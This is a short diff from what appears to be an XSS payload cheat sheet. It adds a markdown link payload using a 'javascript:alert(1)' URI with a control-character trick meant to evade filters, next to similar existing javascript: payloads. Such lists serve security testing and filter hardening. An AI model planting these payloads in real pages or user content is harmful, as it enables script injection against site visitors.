@@ -118,6 +118,10 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 [a]: (javascript:prompt(1))
 ```
 
+```md
+[a]:(javascript:alert(1))           //Add SOH Character
+```
+
 
 **Flash SWF XSS**
 
